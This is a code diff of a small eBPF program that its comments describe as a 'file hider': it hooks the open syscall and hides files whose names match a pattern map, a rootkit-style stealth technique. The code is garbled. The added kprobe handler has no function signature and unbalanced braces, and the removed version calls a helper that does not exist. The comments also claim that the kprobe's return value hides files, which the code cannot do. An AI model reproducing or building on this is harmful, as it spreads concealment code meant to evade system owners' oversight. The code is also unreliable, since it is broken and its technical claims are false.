@@ -2,10 +2,7 @@
 #include <linux/ptrace.h>
 #include <linux/fs.h>
 #include <linux/ktime.h>
-
-struct file_info {
-    char name[256];
-};
+#define MAX 256
 // file hider that hooks into the sys_enter_open tracepoint to intercept open file sys call
 //checks the file name against a pattern map 
 //patterns need to be insterted 
@@ -17,20 +14,22 @@ struct {
     __type(value, int);
 } patterns SEC(".maps");
 
-SEC("tracepoint/syscalls/sys_enter_open")
-int handle_open(struct pt_regs *ctx) {
-    struct file *file = (struct file *)PT_REGS_PARM1(ctx);
-    char name[256];
-    int len = bpf_get_str_from_file(file, name, sizeof(name));
-    if (len > 0) {
-        int hidden = 0;
-        bpf_map_lookup_elem(&patterns, name, &hidden);
-        if (hidden) {
-            // File is hidden, return success ,w/o logging 
-            return 1;
-        }
+SEC("kprobe/__x64_sys_open")
+ char *user_path = (char *)PT_REGS_PARM1(ctx);
+    char buf[MAX];
+
+    // Copy the path from user space into our buffer
+    if (bpf_probe_read_str(buf, sizeof(buf), user_path) <= 0)
+        return 1; 
+
+    // Check if this path is in the pattern map to ignore 
+    int *val = bpf_map_lookup_elem(&patterns, buf);
+    if (val) {
+        // Found – hide this file
+        return 0;
     }
-    return 0;
-}
+
+    //else trace 
+    return 1;
 
 char _license[] SEC("license") = "GPL";
